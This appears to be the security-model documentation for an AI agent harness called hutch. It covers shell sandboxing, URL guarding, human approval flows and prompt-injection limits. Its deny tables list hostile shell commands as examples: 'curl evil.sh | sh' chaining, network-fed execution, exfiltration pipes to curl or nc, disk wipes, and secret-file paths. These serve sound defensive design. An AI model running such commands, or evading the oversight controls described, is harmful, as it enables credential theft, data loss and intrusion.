# Safety model

Reference facts are proposed data, never instructions, tool permissions or verified truth. Schema v15
binds review to immutable content/scope and checks model writes against current execution fencing,
lease expiry, cancellation and terminal state. Private chat facts are not automatically shared;
legacy facts begin unreviewed. Runtime retrieval excludes unreviewed, archived and replaced versions.
JSON/reference framing reduces role confusion but does not prove a model will ignore malicious text.
Independent action policy, receipts and containment remain required. Memory off denies new runtime
reads/writes but cannot retract prior prompts; human management stays available. Credential stores
are never indexed as facts, but user/model text can contain private material and is not a secret vault.

hutch assumes a **supervising human** is part of the system. It is not a formal security boundary
against a determined adversary — it is a policy layer that checks what hutch's own tools are asked to
do. Each rule below traces to a reported failure class in `research/complaints.md` (individual reports,
not measured prevalence).

**What is and is not contained today** (see the live verification boundary in `realignment/ledger.md`):

| | Today |
|---|---|
| File tools (`read_file`, `write_file`, `list_files`) | path-jailed to the workspace |
| Shell tool | New bots request Linux strict mode: bubblewrap gives a private mount/PID/network namespace, private `/tmp`, writable workspace, sanitized environment and bounded resources. `web_fetch` provides checked public-page access; shell networking is unavailable in strict mode. This is shell-only containment, not a VM. Existing bots retain `off` after migration; the UI labels that choice. If strict mode is unavailable, the command fails closed. |
| `web_fetch` | the name is resolved and **every** answer must be a public address; redirects are followed by hutch and each hop re-checked; the connection is pinned to the validated address (no second lookup); credentials in URLs, internal names and every spelling of a loopback/metadata address (`[::1]`, `0x7f.0.0.1`, decimal, IPv4-mapped, NAT64, 6to4) are refused (`netguard.py`, `tests/test_netguard.py`) |
| browser | Chromium uses Hutch's loopback proxy for HTTP(S)/WebSocket traffic. The proxy freshly resolves every connection, rejects the whole answer set if any address is non-public, and connects to a checked numeric address. A local STUN fixture confirms that Hutch's Chromium does not send unproxied WebRTC UDP; plain Chromium does send to the same fixture. This checks that WebRTC setting only, not every browser protocol. Live public destinations and other non-HTTP traffic remain unverified. |
| External runtimes (Pi, OpenCode) | disabled before process creation. Offline protocol helpers cover selected wire formats, but Hutch cannot yet drain/own both process streams, broker permissions end to end, enforce provider budgets, or run either harness inside the owned sandbox. OpenCode 2.0.24's event stream can lose records on disconnect/overflow. Selecting these runtimes fails with an actionable message; they are not supported executors. |
| Stopping a run | an intent recorded in the database: `hutch stop`, `stop-all` and the dashboard work on a run owned by any process. Stopping a run also marks its persisted descendants in one transaction before signaling begins; each owned attempt remains `Stopping` until its own cleanup is verified. Delegated queue rows are not started by the ordinary dispatcher until a dedicated child executor can enforce capability and artifact boundaries. If explicitly executed internally, a lineage run gets a private per-run workspace instead of the bot's shared folder. `serve`, `daemon`, and `hutch run` use one owned process per attempt. Recovery fences the old owner before cleanup and signals only boot/start-verified process identities through pidfds. `Stopping` or `Recovering` remains visible while cleanup is incomplete or cannot be verified; terminal cancellation waits for confirmed cleanup. |

Provider credentials stay route-specific. OpenCode Go asks the user to sign in at OpenCode and copy its issued key;
Hutch never reads `~/.local/share/opencode/auth.json` or the OpenCode browser session. Sign in with ChatGPT, when the
operator explicitly enables its eligibility-gated preview, uses OpenAI's local PKCE/OIDC flow and fixed Responses API
route. OAuth credentials are kept in a private file under Hutch's state directory, are not returned to the UI/API,
and are sent only to OpenAI. ChatGPT plan allowance is provider-controlled; Hutch cannot enforce an output-token cap
on this preview route. Neither integration shares browser cookies or credentials from another client.

Bots start with a fresh workspace for every run. The optional Hutch-managed mode reuses a private, 0700 folder for one bot across its
runs and conversations; the existing-folder mode is explicit and validated. Files never move automatically when a mode changes. Deleting
a bot preserves its managed workspace, and database snapshots do not include managed workspaces or user folders; back them up separately.

The realignment ledger records which behavior is tested, which is only documented, and which requires live provider or device access.

Worker review requests, wait state and inline review events commit together. Canonical decision
summaries override stale transcript asks after a worker crash. Schema v11 resource replay
contains identifiers rather than message, argument or secret content; clients fetch current
resources and preserve draft/focus during refresh. Gaps require snapshot reconciliation, and
restored histories need epoch rotation. Schema v12 delivers JSONL through a separate recoverable
queue, verifies canonical prefixes and retains damaged files before reconstruction. Errors stay
visible; SQLite remains the canonical transcript source. FULL WAL synchronization precedes
acknowledgement of action prerequisites, subject to storage honoring fsync. See
[operations](operations.md), [ADR-0012](adr/0012-resource-outbox-and-reconciliation.md) and
[ADR-0013](adr/0013-recoverable-transcript-files.md).

Schema v16 batches transcript-delivery intent updates with the canonical event transaction. It
removes per-event trigger work while retaining recoverable delivery, hash verification and visible
failures; it does not make the filesystem mirror authoritative.

Schema v13 records immutable tool arguments and reviewed authority before effects. Missing
receipts seal atomically as uncertain even when the runtime returns success. Check the destination
and record an outcome in chat or Needs you; this is an immutable human report, not independent
verification or permission to replay. Matching uncertain effects in the same conversation require
reconciliation. Legacy arguments remain unknown, and original statuses/events are preserved.
Saved intent may contain private user material; keep the state directory private. See
[ADR-0014](adr/0014-immutable-action-review.md).

Provider account/destination changes require per-run outward approval. The exact route and
revision are checked again before provider creation; cached clients cannot retain a removed or
rotated connection key. Generic hosted sticky grants and the old legacy key-routing escape
cannot bypass that boundary. Streaming recovery reserves each attempt separately, retaining
uncertain first usage. These are fixture-tested controls, not live billing certification.

Explicit extra read-only shell mounts are installed after private temporary mounts and the
writable workspace so the declared mode survives execution. Credential descendants, symlinks
outside the granted folder, unreadable trees and grants covering the workspace are refused;
inspection is capped at 10,000 entries, with a narrower-folder error on exhaustion. These are
launch-time checks on operator-owned configuration, not a filesystem watcher.

## The three verdicts

Every action is classified **allow** (runs silently), **ask** (pauses for a human), or
**deny** (refused, logged, never executed).

### Shell commands

The line is read the way a shell reads it **before** any rule is matched, and every place a command can hide is
analysed, because the chained-command allowlist bypass (`git status && curl evil.sh | sh`) that lived for a year in a
popular agent is only the simplest member of a family. Each segment is classified; the worst verdict wins.

| Where a command can hide | Handled |
|---|---|
| after `&&`, `\|\|`, `;`, `\|`, `\|&`, a bare `&`, or a newline | each is a separator |
| command substitution `$(...)` and backticks, **including inside double quotes** | the inner command is analysed recursively |
| process substitution `<(...)` / `>(...)`, subshells `( ... )`, groups `{ ...; }` | read as their contents |
| `bash -c '...'`, `sh -c`, `eval '...'` | the string is analysed as a command line |
| `env`, `nohup`, `timeout`, `nice`, `time`, `command`, `exec`, `xargs`, `watch`, ... | the wrapped command is analysed |
| `find ... -exec cmd {} \;` and `find ... -delete` | the payload is analysed; `-delete` asks |
| here-documents | the body is data, **unless the delimiter is unquoted**, when `$(...)` inside it runs |
| a program name chosen at run time (`$(echo sudo) ls`, `${SH} x`, `~/bin/x`, `./*.sh`) | denied: cannot be checked |
| `sh -c "$(curl ...)"`, `bash <(curl ...)`, `source <(...)` fed by the network | denied: runs downloaded content |
| redirects (`>`, `>>`, `&>`) to `/etc/x`, `~/x`, `$HOME/x`, `../x`, `/tmp/x` | denied: writes outside the workspace |
| an unterminated quote or substitution, a stray parenthesis, an oversized or too deeply nested line | denied: "could not check this command safely" |

The parser is a conservative reader, not a shell: it never expands anything, it only has to find every place a command
can hide, and **when it cannot read a line with confidence it denies**. `$(( x + 1 ))` stays arithmetic; `$(( sudo ls ))`
(which bash may read as a subshell) is analysed as a command. It is fuzzed (`tests/test_shellparse.py`): random
combinations of up to three nesting contexts around hard-denied, ask-class and benign commands must keep every
hard-deny denied (also under `trusted` and an `allow: *` rule), never turn an ask into an allow, never block a benign
command, and no input of any shape may make the analyser raise.

**Hard-denied classes** (never executable, regardless of sticky allows or `auto` mode):

| Class | Examples |
|---|---|
| Privilege escalation | `sudo`, `su`, `doas`, `pkexec`, `visudo` |
| Escapes & wipes | `rm -rf /`, `~`, `$HOME`, `..`; `dd`, `shred`, `mkfs*`, `fdisk`, `parted`, `wipefs` |
| Power & system | `shutdown`, `reboot`, `halt`, `poweroff`, `systemctl`-adjacent power targets, `crontab`, `passwd` |
| Secrets access | any argument touching `~/.ssh`, `id_rsa`, `.env`, `~/.aws`, `~/.gnupg`, `/etc/shadow`, `.git-credentials`, `.npmrc`, `.netrc` |
| Pipe to interpreter | `… | sh`, `… | bash`, `… | python3`, `… | perl`, `… | node` |
| Exfiltration channels | `… | curl`, `… | nc`, `… | ssh` (command output piped to the network) |
| Upload flags on fetchers | `curl -X POST … -d`, `curl -T`, `wget --post-data`, pipe-input variants |
| Resource attacks | fork-bomb patterns |

**Ask** classes (approval once, sticky "always allow" available): `rm`/`mv`/`chmod`/`chown` inside
the workspace, `git push|reset|clean|checkout|rebase`, package managers, `kill`/`pkill`, `docker`,
`ssh`/`scp`/`rsync`.

### Risk tier and command rules (per bot)

Each bot has a **risk tier** and optional **command rules**. They only ever refine the **ask** zone:

| Tier | What happens to a medium-risk action (would ask) |
|---|---|
| `readonly` | blocked, with the reason "this bot is read-only" (file writes included) |
| `supervised` (default) | asks |
| `trusted` | runs without asking, **except** anything that sends data out of the machine, which still asks |

Rules are one per line, `allow: <glob>`, `ask: <glob>` or `deny: <glob>` (first match wins), matched against each
command segment, **including commands inside wrappers and substitutions** (a `deny: git push*` also stops
`nohup git push`, `bash -c 'git push'` and `echo $(git push)`). A rule can tighten any decision, or let a medium-risk
command run. Three limits are structural, not conventions, and are tested:

1. a **hard deny is final**: no rule and no tier turns secrets access, exfiltration, `sudo` or a workspace escape into
   allow or ask;
2. an **outward send always asks** (SR-4): an `allow` rule or the `trusted` tier cannot suppress it;
3. an `allow` rule on an outer command **cannot launder** a more dangerous command nested inside it.

Set them on the bot page, with `hutch bot create --risk-tier readonly --rule 'deny: git push*'` /
`hutch bot update --clear-rules`, or in the API (`risk_tier`, `command_rules`). A malformed rule is rejected naming the
line instead of silently doing nothing.

When `sandbox: strict`, a command runs in bubblewrap with `HOME` and `cwd` inside the workspace, a minimal environment, a private
temporary directory, no shell network and host-configured CPU, memory, process, file-size and open-file limits. This only covers
the shell subprocess. `sandbox: off` is explicitly uncontained execution as the Hutch user; it uses the same policy and timeout.

### File paths

Read/list must resolve inside the run workspace (real-path resolution, so `sub/../x` stays inside
and `../../.ssh` does not). Writes additionally require approval (sticky `files:write`).
Absolute paths outside the workspace are denied.

File-write requests persist the full proposed contents, workspace and destination revision in
their approval fingerprint. A file created or edited while a person reviews it requires a new
request. Linux writes walk directory descriptors without following symlinks, serialize Hutch
writers on the workspace, and atomically replace the file; replacing a hard link does not alter
its other names. Temporary files are removed on ordinary failure. The lock coordinates Hutch
writers, not arbitrary host applications: a hostile owner editing the directory concurrently
is outside this boundary. Reads/listing still use real-path policy and are not descriptor-based.

### URLs

`web_fetch` and the browser accept public `http(s)` only, decided on **addresses**, not spellings (`hutch/netguard.py`):
non-http schemes, credentials in the URL, internal names (`localhost`, `*.internal`, `*.local`), and any address that is not
public (loopback, private, link-local incl. cloud metadata, CGNAT, multicast, reserved; IPv4 embedded in IPv6 is unwrapped) are
refused, whichever way the address is written and whichever name resolves to it. Redirects are followed by hutch and every hop is
re-checked. Response bodies are hard-clipped. Chromium browser traffic uses an owned loopback proxy: for each HTTP, HTTPS or
WebSocket connection it freshly resolves the destination, rejects mixed public/private DNS answers, and connects to a numeric
validated address. HTTPS uses CONNECT, leaving TLS certificate and hostname checks in Chromium. Local Chromium fixtures cover
ordinary HTTP and a redirect where a formerly public DNS answer turns private before the next connection. Chromium also uses
`disable_non_proxied_udp`; a local STUN fixture observed UDP from default Chromium but none from Hutch's configured browser. This
only checks that WebRTC path. Traffic outside the configured HTTP proxy remains unverified except for that fixture, and live public
destinations have not been tested. A locally configured model endpoint is an explicit exception made by a connection, not by a URL
pattern.

### Browser actions

`goto` uses URL policy. `click` and `type` always ask because either can send data or buy something;
sticky grants and auto mode cannot cover them. The request binds the selector/label, typed text,
page URL and bot profile. A changed URL after review refuses the action. This does not verify an
account identity or prevent a page changing its DOM at the same URL. Each browser-tool instance owns a separate context and
persistent profile, with an OS file lease across run workers. HTTP(S)/WebSocket connections pass through the DNS-pinning local
proxy; this has only local Chromium fixture coverage and does not confine unrelated browser protocols. Headless is
the default. Chromium's implicit local/link-local proxy bypass is disabled, service workers are blocked, and denied request logs
retain only the origin. A bot may opt into **Local browser handoff** on a Linux desktop: Hutch opens the same profile in a visible window,
holds an exclusive Hutch browser-handoff/profile lease, pauses automation at a detected login/CAPTCHA/MFA wall, and rechecks the page after Resume.
If the resumed page still shows a challenge, Hutch keeps waiting. Without the setting, a headless run returns an actionable failure
instead of claiming to wait for a person. This is local desktop control only and does not enable phone control.

## Rehearse (dry run)

A run started with **Rehearse** simulates the builtin tools' mutating operations. Reads and model
calls still happen; rehearsal is not a network-disconnected preview. The tools enforce simulation:

- **Reads run for real**: `read_file`, `list_files`, `web_fetch`, browser `goto`/`read`/`wait`, `recall`, and shell commands
  that are provably read-only.
- **Everything else is only described.** `write_file`, `remember`, browser `click`/`type`/`screenshot` and any shell
  command that is not read-only reply `[rehearsal] would ...` with the policy's verdict ("would pause for approval", or
  "would be BLOCKED: ..."), and the transcript marks the result **simulated**. A simulated action asks nobody, because
  nothing happens.
- **Read-only is an allowlist, and unsure means simulated**: `ls`, `cat`, `grep`, `find` (without `-exec`/`-delete`), `git
  status|log|diff|show`, `sort`, `wc`, `echo`, and similar, joined by pipes and `&&`. A write redirect, a background job, a
  heredoc, a wrapper (`bash -c`, `env`, `xargs`), a substitution containing a non-read-only command, `sed`, `awk`, `tee`,
  `python`, `curl` are all treated as mutating.

Limits: a rehearsal still calls the model (and so can cost money on a hosted one), and a read that has a side effect on
someone else's server (a `GET` that logs you out) still happens.

## Approval flow

1. A tool hits an **ask** verdict → an `ApprovalRequest` row is created; the run enters
   `waiting_approval` in the same transaction, and the dashboard/CLI show the exact action and arguments.
2. A human approves (optionally **always allow** for that bot+action-key) or denies.
3. Unanswered requests expire after **10 minutes and are recorded as expired**. Silence is never
   consent; a stopped dashboard cannot leave a bot waiting forever without that being visible.

`approval_mode: auto` skips asks (allowlist-only mode) for bots you trust — the hard-deny classes
still apply. Outward browser/provider-route actions require review even in auto mode.
An expired owner cannot create a new approval or reserve another provider call, even before recovery.
Approval arguments cannot be rewritten after admission. A decision for an expired/stopped
execution is recorded as expired and cannot grant standing permission.

Browser alerts are off until a person enables them from Needs you and grants the browser's
notification permission. While the tab is open and backgrounded, a new pending approval or
uncertain action can produce a generic notice; it contains no bot name, conversation text or action
arguments. The click opens the local review queue. This is not push delivery and cannot reach a
closed tab, sleeping host or disconnected device.

### Remote dashboard access is experimental

Hutch stays on loopback unless an operator enables direct remote binding with trusted TLS certificates. A host-issued pairing code can
open the responsive dashboard in a browser; each browser receives its own HttpOnly, revocable session. Keep the listener on a private
network and do not expose it to the public internet. Connections or the CLI can revoke a lost session. The pairing and session UI has
local browser-fixture coverage, but no physical-device or private-network validation; the host must remain awake and connected.
Authenticated PTY/physical desktop controls and remote phone browser handoff are not implemented. Local browser handoff is
experimental and needs a Linux display plus the optional Playwright browser. The marketing site cannot reach Hutch on localhost.

## Honest limits (read this)

- **External runtimes** (`pi`, `opencode`) are disabled. They cannot currently satisfy Hutch's process ownership, approval,
  credential routing, sandbox and usage-reservation requirements. The builtin runtime is the only production model-backed executor;
  test scenarios are not available to application users. Builtin calls reserve estimated tokens and priced currency before a request; provider billing can differ, and
  uncertain outcomes remain held until an operator reconciles the provider record.
  Worker accounting requires current ownership, cannot change reservation identity, and cannot
  overwrite an uncertain hold. Outstanding holds do not disappear when an allowance window rolls over.
- **A supervised human is assumed.** Prompt injection can still produce plausible-but-wrong actions
  inside the allowed toolset; the transcripts, caps, and approvals bound the damage.
- **Script contents are not analysed.** `bash script.sh`, `python3 x.py` and `python3 -c '...'` run what is in them: bots
  write and run code, so this is allowed. What those scripts do is bounded by the workspace-jailed `HOME`, the minimal
  environment and the timeout, not by the parser. Commands other than `>` redirects (`cp`, `tee`, `install`, `touch`
  with an absolute path) are not path-jailed either.
- **Compatibility threads are not a sandbox.** They share the Hutch process. Production commands use owned worker processes;
  new bots request Linux bubblewrap strict containment for the shell. A malicious package install remains bounded only when the
  bot's sandbox is strict. Browser, physical desktop and external-runtime process boundaries are separate.
- **Shutdown is verified.** Signal listeners finish before persistence closes, and cancellation cleanup finishes before
  terminal status. A blocked event writer prevents database closure and produces an error; after it exits, closure can be retried.
  This does not turn a blocked writer into a successful flush or discard its pending work.
  Stop expires pending approvals with its persisted cancellation intent; requests arriving afterwards expire immediately.
  Approval admission checks the worker's fence, so a recovered worker cannot introduce another pending decision.
- Models can lie about completion. That's why artifacts (files written, command exits) are in the
  transcript, not just the model's claims.

## Database restoration boundary

A snapshot copies committed database history and can lag external effects. Restore creates a
new held installation, validates history, quarantines old work and detaches source process
records from cleanup authority. It never claims the source was stopped. Devices and standing
grants are revoked and schedules paused. A local review permits new work without requeueing
old attempts. Snapshot hashes do not prove external outcomes or protect against a same-user
administrator; credentials, browser profiles and user files need separate backups/review.
See [Operations](operations.md#database-migration-and-restore). Isolated fixture tests do not
certify a production cutover or storage power loss.

## Local inference admission boundary

Hutch admits one local caller and up to eight waiting callers across processes sharing a state
directory. Startup/loading and each call hold the slot; tools and human waits release it. Stop
removes a queued caller before usage reservation. Kernel locks release on process death, but
this does not prove the model server stopped work or prevent unrelated clients from calling it.
Native Ollama checks current RAM/GPU headroom and uses only backend-reported resident allocation
credit. Fit remains an estimate; unknown GPU free memory refuses execution. Other local protocols
have caller bounds but no validated memory admission. A bot's `local` model-route setting blocks
hosted model choices, known hosted fallback routes, and recognized Ollama cloud-tagged model names;
`hybrid` permits local and hosted model routes under existing destination review and budget controls.
This is provider/model-name classification, not strict-offline enforcement: a configured local
endpoint may proxy requests, unknown cloud naming may evade a name-based check, and network-capable
tools retain their own policy. The separate experimental `offline` mode is host-gated. Hutch tests
a fresh bubblewrap network/PID namespace against loopback and a host-interface TCP listener, while
confirming a mounted Unix socket is reachable and checking the isolated PID view. Workers receive no
provider keys, proxy variables, or custom endpoint environment overrides; saved `connections.json`
and `keys/` are hidden behind read-only empty mounts while SQLite run state stays available. A private
per-run Unix-socket broker forwards HTTP only
to configured numeric loopback model endpoints; browser and web-fetch tools are omitted, and shell
requires the existing bubblewrap no-network sandbox. systemd scopes apply resource caps only. A
failed capability check refuses both configuration and run start. This Linux development host now
passes the local TCP/Unix-socket probe, and a fixture provider completed a request from an isolated
worker; no public destination or live model was contacted. The separately running local model
service remains outside Hutch's worker boundary and may itself access the network. Hutch does not
claim that a local model server or model label proves inference provenance. `GET /api/v1/capabilities`
reports the current host result.
